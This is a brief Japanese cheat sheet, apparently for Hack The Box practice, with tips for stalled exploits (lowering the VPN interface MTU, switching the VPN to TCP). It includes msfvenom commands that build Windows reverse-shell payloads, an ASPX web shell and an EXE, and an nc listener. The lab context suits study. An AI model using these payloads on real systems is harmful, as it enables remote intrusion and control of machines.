# htb

exploitが止まる時

①MTUを下げる（Kali特有の問題）
VPN経由の大きなSMBパケットがフラグメントされて壊れるのが最多原因
sudo ip link set dev tun0 mtu 1200

②VPNをUDP→TCP



msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xxx.xxx LPORT=4444 -f aspx -o shell.aspx

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xxx.xxx LPORT=4444 -f exe -o shell2.exe

nc -lvnp 4444

